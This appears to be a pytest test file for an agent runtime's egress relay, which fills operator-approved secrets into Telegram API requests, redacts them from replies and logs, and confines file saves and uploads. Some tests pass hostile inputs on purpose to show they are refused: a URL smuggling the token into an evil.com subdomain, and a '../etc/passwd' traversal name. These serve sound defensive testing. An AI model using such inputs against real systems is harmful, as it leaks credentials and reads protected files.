"""The grant relay (runtime/hive/relay.py): secrets filled in hive, egress grant
checked, the value redacted from every answer and log line."""

from __future__ import annotations

import json
from datetime import datetime, timezone

import httpx
import pytest

from runtime.hive.grants import GrantError, Grants
from runtime.hive.lifecycle import HiveLog
from runtime.hive.relay import BODY_MAX, Relay

T0 = datetime(2026, 11, 10, 12, 0, 0, tzinfo=timezone.utc)
TOKEN = "123456:AAH-secret-bot-token"


@pytest.fixture
def vault(tmp_path):
    log = HiveLog(tmp_path / "events.jsonl")
    grants = Grants(tmp_path / "grants.sqlite", log=log, clock=lambda: T0)
    grants.approve(entry_id=1, kind="egress", what="api.telegram.org", actor="operator")
    grants.approve(
        entry_id=2, kind="secret", what="telegram_bot_token", actor="operator", secret=TOKEN
    )
    yield grants, log, tmp_path
    grants.close()


def _relay(grants, log, handler, tmp_path=None):
    seen: list[httpx.Request] = []

    def wrapped(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return handler(request)

    relay = Relay(
        grants, log=log,
        artifacts_root=tmp_path / "artifacts" if tmp_path is not None else None,
        transport=lambda: httpx.Client(transport=httpx.MockTransport(wrapped)),
    )
    return relay, seen


def test_secret_filled_and_redacted(vault):
    grants, log, tmp = vault

    def handler(request):
        # an API that echoes the url back: the token must not come back to the agent
        return httpx.Response(200, json={"ok": True, "echo": str(request.url)})

    relay, seen = _relay(grants, log, handler)
    out = relay.fetch(
        "last-order", "post",
        "https://api.telegram.org/bot{{secret:telegram_bot_token}}/sendMessage",
        None, {"chat_id": "@lastorder", "text": "привет"},
    )
    assert out["status"] == 200
    assert TOKEN in str(seen[0].url)
    assert json.loads(seen[0].content) == {"chat_id": "@lastorder", "text": "привет"}
    assert seen[0].headers["content-type"] == "application/json"
    assert TOKEN not in out["body"]
    assert "{{secret:telegram_bot_token}}" in out["body"]
    events = (tmp / "events.jsonl").read_text(encoding="utf-8")
    assert TOKEN not in events
    assert "relay.fetch" in events


def test_domain_without_grant_refused(vault):
    grants, log, _ = vault
    relay, seen = _relay(grants, log, lambda r: httpx.Response(200))
    with pytest.raises(GrantError) as err:
        relay.fetch("last-order", "GET", "https://example.org/x")
    assert err.value.status == 403
    assert not seen


def test_secret_cannot_be_smuggled_into_host(vault):
    grants, log, _ = vault
    relay, seen = _relay(grants, log, lambda r: httpx.Response(200))
    with pytest.raises(GrantError):
        relay.fetch("last-order", "GET", "https://{{secret:telegram_bot_token}}.evil.com/")
    assert not seen


def test_unknown_or_revoked_secret_refused(vault):
    grants, log, _ = vault
    relay, seen = _relay(grants, log, lambda r: httpx.Response(200))
    with pytest.raises(GrantError):
        relay.fetch("last-order", "GET", "https://api.telegram.org/bot{{secret:other}}/getMe")
    grants.revoke(kind="secret", what="telegram_bot_token", actor="operator")
    with pytest.raises(GrantError):
        relay.fetch(
            "last-order", "GET", "https://api.telegram.org/bot{{secret:telegram_bot_token}}/getMe"
        )
    assert not seen


def test_plain_http_and_bad_method_refused(vault):
    grants, log, _ = vault
    relay, _ = _relay(grants, log, lambda r: httpx.Response(200))
    with pytest.raises(GrantError):
        relay.fetch("last-order", "GET", "http://api.telegram.org/")
    with pytest.raises(GrantError):
        relay.fetch("last-order", "TRACE", "https://api.telegram.org/")


def test_secret_in_header_and_long_body_truncated(vault):
    grants, log, _ = vault
    relay, seen = _relay(grants, log, lambda r: httpx.Response(200, text="x" * (BODY_MAX + 10)))
    out = relay.fetch(
        "last-order", "GET", "https://api.telegram.org/getMe",
        {"Authorization": "Bearer {{secret:telegram_bot_token}}"},
    )
    assert seen[0].headers["authorization"] == f"Bearer {TOKEN}"
    assert out["truncated"] is True and len(out["body"]) == BODY_MAX


def test_transport_error_is_redacted(vault):
    grants, log, _ = vault

    def handler(request):
        raise httpx.ConnectError(f"cannot reach {request.url}")

    relay, _ = _relay(grants, log, handler)
    with pytest.raises(GrantError) as err:
        relay.fetch(
            "last-order", "GET", "https://api.telegram.org/bot{{secret:telegram_bot_token}}/getMe"
        )
    assert err.value.status == 502
    assert TOKEN not in err.value.message


# --- the file mode (ADR-053) ---------------------------------------------------------


def test_save_to_writes_response_bytes_under_the_root(vault, tmp_path):
    grants, log, _ = vault
    payload = b"\x89PNG\r\n\x1a\n" + b"0" * 1024

    def handler(request):
        return httpx.Response(200, content=payload, headers={"content-type": "image/png"})

    relay, _ = _relay(grants, log, handler, tmp_path)
    out = relay.fetch("last-order", "GET", "https://api.telegram.org/file.png", save_to="shot.png")
    saved = tmp_path / "artifacts" / "shot.png"
    assert out["status"] == 200 and out["size"] == len(payload)
    assert out["path"] == str(saved) and out["content_type"] == "image/png"
    assert saved.read_bytes() == payload
    assert "body" not in out  # the point: bytes never ride into the agent context


def test_save_to_rejects_bad_names_and_paths(vault, tmp_path):
    grants, log, _ = vault
    relay, _ = _relay(grants, log, lambda r: httpx.Response(200), tmp_path)
    for bad in ("../etc/passwd", "sub/dir.png", "", "x" * 101, "спутник.png", 42):
        with pytest.raises(GrantError) as err:
            relay.fetch("last-order", "GET", "https://api.telegram.org/x", save_to=bad)
        assert err.value.status == 422


def test_save_to_caps_the_size(vault, tmp_path):
    import runtime.hive.relay as relay_mod

    grants, log, _ = vault
    big = b"0" * (relay_mod.SAVE_MAX_BYTES + 1)
    relay, _ = _relay(grants, log, lambda r: httpx.Response(200, content=big), tmp_path)
    with pytest.raises(GrantError) as err:
        relay.fetch("last-order", "GET", "https://api.telegram.org/big", save_to="big.bin")
    assert err.value.status == 507
    assert not (tmp_path / "artifacts" / "big.bin").exists()


def test_upload_file_sends_multipart_with_fields_and_secrets(vault, tmp_path):
    grants, log, _ = vault
    artifacts = tmp_path / "artifacts"
    artifacts.mkdir()
    (artifacts / "shot.png").write_bytes(b"\x89PNG-fake")

    def handler(request):
        body = request.content.decode("utf-8", "replace")
        return httpx.Response(200, json={"ok": True, "seen": body[:200]})

    relay, seen = _relay(grants, log, handler, tmp_path)
    out = relay.fetch(
        "last-order", "POST",
        "https://api.telegram.org/bot{{secret:telegram_bot_token}}/sendPhoto",
        fields={"chat_id": "{{secret:telegram_bot_token}}", "caption": "пост сети"},
        upload_file="shot.png", upload_part="photo",
    )
    sent = seen[0]
    assert out["status"] == 200
    assert b"\x89PNG-fake" in sent.content
    assert b'name="photo"' in sent.content and b'name="chat_id"' in sent.content
    assert TOKEN in str(sent.url)                  # filled server-side, in the url path
    assert TOKEN.encode() in sent.content          # ...and in a field (a secret chat_id)
    assert TOKEN not in out["body"]                # the echo is redacted back


def test_upload_file_refuses_body_and_missing_or_escaped_files(vault, tmp_path):
    grants, log, _ = vault
    relay, _ = _relay(grants, log, lambda r: httpx.Response(200), tmp_path)
    with pytest.raises(GrantError) as err:  # body and upload_file are exclusive
        relay.fetch("last-order", "POST", "https://api.telegram.org/sendPhoto",
                    body={"x": "1"}, upload_file="shot.png")
    assert err.value.status == 422
    with pytest.raises(GrantError) as err:  # the file must exist in /artifacts
        relay.fetch("last-order", "POST", "https://api.telegram.org/sendPhoto",
                    upload_file="missing.png")
    assert err.value.status == 422
    outside = tmp_path / "outside.png"
    outside.write_bytes(b"x")
    with pytest.raises(GrantError) as err:  # a path outside the volume is refused
        relay.fetch("last-order", "POST", "https://api.telegram.org/sendPhoto",
                    upload_file=str(outside))
    assert err.value.status == 422
